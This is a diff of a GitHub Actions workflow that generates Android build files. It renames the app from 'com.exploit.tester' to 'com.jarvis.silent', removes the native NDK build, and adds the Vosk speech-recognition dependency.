-      - name: Generate Application.mk
-        run: |
-          cat > app/src/main/jni/Application.mk << 'EOF'
-          APP_ABI := arm64-v8a armeabi-v7a
-          APP_PLATFORM := android-34
-          APP_STL := c++_shared
           EOF
 
       - name: Generate build.gradle (app)
@@ -475,17 +535,11 @@ jobs:
               compileSdk 34
               
               defaultConfig {
-                  applicationId "com.exploit.tester"
-                  minSdk 34
+                  applicationId "com.jarvis.silent"
+                  minSdk 26
                   targetSdk 34
-                  versionCode 2
-                  versionName "2.0"
-                  
-                  externalNativeBuild {
-                      ndkBuild {
-                          cFlags "-Wall"
-                      }
-                  }
+                  versionCode 1
+                  versionName "1.0"
               }
               
               buildTypes {
@@ -497,17 +551,13 @@ jobs:
                   }
               }
               
-              externalNativeBuild {
-                  ndkBuild {
-                      path "src/main/jni/Android.mk"
-                  }
-              }
-              
-              namespace 'com.exploit.tester'
+              namespace 'com.jarvis.silent'
           }
           
           dependencies {
               implementation 'androidx.appcompat:appcompat:1.6.1'
+              implementation 'androidx.core:core:1.12.0'
+              implementation 'com.alphacephei:vosk-android:0.9.0'
           }
           EOF
 
@@ -523,25 +573,16 @@ jobs:
                   classpath 'com.android.tools.build:gradle:8.1.4'
               }
           }
-          
           allprojects {
               repositories {
                   google()
                   mavenCentral()
               }
           }
-          
-          task clean(type: Delete) {
-              delete rootProject.buildDir
-          }
           EOF
 
       - name: Generate settings.gradle
-        run: |
-          cat > settings.gradle << 'EOF'
-          rootProject.name = "UltimateExploitTester"
-          include ':app'
-          EOF
+        run: echo "include ':app'" > settings.gradle
 
       - name: Generate Gradle Wrapper
         run: |
@@ -556,5 +597,5 @@ jobs:
       - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
-          name: UltimateExploitTester
+          name: JARVIS-Silent
           path: app/build/outputs/apk/debug/app-debug.apk
